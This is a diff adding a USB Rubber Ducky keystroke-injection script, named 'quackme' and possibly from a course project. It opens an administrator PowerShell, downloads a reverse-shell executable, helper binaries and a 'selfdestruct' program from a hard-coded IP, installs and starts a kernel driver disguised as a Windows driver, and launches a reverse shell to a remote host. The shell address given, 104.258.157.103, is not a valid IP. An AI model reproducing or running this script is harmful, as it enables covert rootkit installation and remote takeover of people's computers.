@@ -1,0 +1,63 @@
+REM Ducky Script to install rootkit and run payload
+
+REM Open Windows menu and run powershell as administrator
+CONTROL ESCAPE
+DELAY 1000
+STRING powershell
+DELAY 1000
+ADMIN
+DELAY 1000
+LEFTARROW
+ENTER
+DELAY 1000
+
+REM Now we have powershell, make _kit directory
+STRING mkdir $env:SystemDrive\_kit 
+ENTER
+DELAY 500
+
+REM Download setup files to $env:SystemDrive\_kit
+
+REM Download _quackme_revshell.exe
+STRING (New-Object System.Net.WebClient).DownloadFile("http://104.248.157.103:8080/_quackme_revshell.exe", "$env:SystemDrive\_kit\_quackme_revshell.exe")
+ENTER
+DELAY 1000
+
+REM Download ccrypt.exe
+STRING (New-Object System.Net.WebClient).DownloadFile("http://104.248.157.103:8080/ccrypt.exe", "$env:SystemDrive\_kit\ccrypt.exe")
+ENTER
+DELAY 1000
+
+REM Download cygwin1.dll
+STRING (New-Object System.Net.WebClient).DownloadFile("http://104.248.157.103:8080/cygwin1.dll", "$env:SystemDrive\_kit\cygwin1.dll")
+ENTER
+DELAY 1000
+
+REM Download selfdestruct.exe
+STRING (New-Object System.Net.WebClient).DownloadFile("http://104.248.157.103:8080/selfdestruct.exe", "$env:SystemDrive\_kit\selfdestruct.exe")
+ENTER
+DELAY 1000
+
+REM Download quackme.sys to $env:windir\drivers
+STRING (New-Object System.Net.WebClient).DownloadFile("http://104.248.157.103:8080/quackme.sys", "$env:WinDir\System32\drivers\quackme.sys")
+ENTER
+DELAY 1000
+
+REM Register quackme.sys and start
+STRING cmd.exe /c sc.exe create quackme binpath= %windir%\System32\drivers\quackme.sys type= kernel start= demand error= normal DisplayName= quackme
+ENTER
+DELAY 1000
+STRING cmd.exe /c sc.exe description quackme "Windows Driver for OSPJ"
+ENTER
+DELAY 1000
+STRING cmd.exe /c sc.exe start quackme
+ENTER
+DELAY 1000
+
+REM Execute payload
+STRING cmd.exe /c %SystemDrive%\_kit\_quackme_revshell.exe 104.258.157.103 80
+ENTER
+DELAY 1000
+ALT F4
+
+REM END
